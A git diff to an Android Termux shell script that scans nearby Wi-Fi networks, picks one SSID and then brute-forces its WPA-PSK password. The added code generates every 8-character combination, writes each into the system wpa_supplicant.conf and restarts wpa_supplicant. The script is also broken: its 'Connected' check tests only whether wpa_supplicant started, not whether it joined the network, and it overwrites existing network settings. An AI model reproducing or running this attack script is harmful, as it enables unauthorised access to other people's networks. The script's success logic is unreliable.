@@ -21,10 +21,8 @@ for i in {3..1}; do
 done
 
 termux-wifi-enable true
-# Executar a varredura Wi-Fi e armazenar a saída em wifi_info
 wifi_info=$(termux-wifi-scaninfo)
 
-# Extrair o menor RSSI e o SSID correspondente
 min_rssi=-100
 min_ssid=""
 for row in $(echo "${wifi_info}" | jq -c '.[]'); do
@@ -36,6 +34,45 @@ for row in $(echo "${wifi_info}" | jq -c '.[]'); do
     fi
 done
 
-# Exibir o menor RSSI e o SSID correspondente na tela
-echo "Menor RSSI: ${min_rssi}"
-echo "SSID correspondente: ${min_ssid}"
+characters="0123456789qwertyuiopasdfghjklçzxcvbnmQWERTYUIOPASDFGHJKLÇZXCVBNM,.<>;/:?°~]^}º´\`[{ª-_=+§)(*&¨%\$#@!¹²³£¢¬\\|"
+
+min_length=8
+
+generate_combinations() {
+    local prefix="$1"
+    local remaining_length="$2"
+
+    if [ "$remaining_length" -eq 0 ]; then
+        echo "$prefix"
+        return
+    fi
+
+    for ((i = 0; i < ${#characters}; i++)); do
+        local current_char="${characters:i:1}"
+        generate_combinations "$prefix$current_char" $((remaining_length - 1))
+    done
+}
+
+echo "Connecting to $min_ssid..."
+
+while IFS= read -r senha; do
+    cat > /data/misc/wifi/wpa_supplicant.conf <<EOF
+    ctrl_interface=/data/misc/wifi/wpa_supplicant
+    ctrl_interface_group=1010
+    update_config=1
+    ap_scan=1
+
+    network={
+        ssid="$min_ssid"
+        psk="$senha"
+        key_mgmt=WPA-PSK
+    }
+EOF
+
+    killall wpa_supplicant
+    wpa_supplicant -B -i wlan0 -c /data/misc/wifi/wpa_supplicant.conf
+    if [ $? -eq 0 ]; then
+        echo "Connected to $min_ssid."
+        break
+    fi
+done < <(generate_combinations "" $min_length)
